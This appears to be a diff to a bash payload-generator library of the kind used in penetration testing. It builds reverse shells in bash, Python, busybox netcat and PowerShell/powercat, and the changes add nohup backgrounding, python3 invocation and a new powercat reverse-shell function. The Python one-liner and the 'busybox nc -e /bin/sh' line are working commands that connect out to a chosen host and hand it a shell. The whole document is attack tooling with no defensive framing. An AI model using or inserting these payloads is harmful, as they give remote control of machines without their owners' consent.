@@ -19,7 +19,7 @@ get_bash_reverse_shell() {
     if [[ -z "$no_hup" ]] || [[ "$no_hup" == "true" ]]; then
         reverse_shell='nohup '"$reverse_shell"' &'
     fi
-      if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
+    if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
         reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
         reverse_shell="{\"bash\", \"-c\" , \"$reverse_shell\"}"
     elif [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then        
@@ -34,9 +34,9 @@ get_python_reverse_shell() {
     local reverse_shell='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$host_ip'",'$host_port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
     if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
         #reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
-        reverse_shell="{\"python\", \"-c\" , \"$reverse_shell\"}"
+        reverse_shell="{\"python3\", \"-c\" , \"$reverse_shell\"}"
     elif [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then
-        reverse_shell="python -c '$reverse_shell'"
+        reverse_shell="python3 -c '$reverse_shell'"
 
     fi
     echo "$reverse_shell"
@@ -54,6 +54,9 @@ get_nc_reverse_shell() {
 get_busybox_reverse_shell() {
     prepare_generic_linux_shell
     local reverse_shell='busybox nc '"$host_ip"' '"$host_port"' -e /bin/sh'
+    if [[ -z "$no_hup" ]] || [[ "$no_hup" == "true" ]]; then
+        reverse_shell='nohup '"$reverse_shell"' &'
+    fi
     echo "$reverse_shell"
 }
 
@@ -114,6 +117,31 @@ get_powershell_reverse_shell_cmd() {
     echo $(encode_powershell "$reverse_shell")
 }
 
+get_powercat_reverse_shell() {
+    if [ ! -z "$1" ]; then
+        host_port=$1
+    fi
+    if [ -z "$host_port" ]; then
+        host_port=4444
+    fi
+    if [ ! -z "$2" ]; then
+        host_ip=$2
+    fi
+    if [ -z "$host_ip" ]; then
+        host_ip=$(get_host_ip)  # Function to get the host IP address
+    fi
+    cp /usr/share/windows-resources/powercat/powercat.ps1 .
+    reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_shell_powercat.ps1 |sed -E 's/\$\{http_ip\}/'$http_ip'/g' | sed -E 's/\$\{http_port\}/'$http_port'/g' | sed -E 's/\$\{host_port\}/'$host_port'/g' | sed -E 's/\$\{host_ip\}/'$host_ip'/g' )
+    reverse_shell=$(echo "$reverse_shell" | tr '\n' ' ' | sed -E 's/[[:space:]][[:space:]]+/\ /g')
+    if [[ ! -z $background_shell ]] && [[ "$background_shell" == "false" ]]; then
+        reverse_shell=$(echo "$reverse_shell" | sed -E 's/\$background = \$true/\$background = \$false/g')
+    fi
+    if [ "$encode_shell" == "false" ]; then
+        echo "$reverse_shell"
+        return 0
+    fi
+    echo $(encode_powershell "$reverse_shell")
+}
 
 get_powershell_interactive_shell() {
     if [ ! -z "$1" ]; then
@@ -148,6 +176,9 @@ get_powershell_interactive_shell() {
     reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_interactive_shell_stub.ps1 | sed -E 's/\$\{http_ip\}/'$http_ip'/g' | sed -E 's/\$\{http_port\}/'$http_port'/g' | sed -E 's/\$\{filename\}/'$shell_file_name'/g')
     if [[ ! -z "$powershell_additional_commands" ]]; then
         reverse_shell=$(echo "$reverse_shell" | sed -E 's/\$\{additional_commands\}/'$powershell_additional_commands'/g')
+    fi
+    if [[ ! -z $background_shell ]] && [[ "$background_shell" == "false" ]]; then
+        reverse_shell=$(echo "$reverse_shell" | sed -E 's/\$background = \$true/\$background = \$false/g')
     fi
     if [ "$encode_shell" == "false" ]; then
         echo "$reverse_shell"
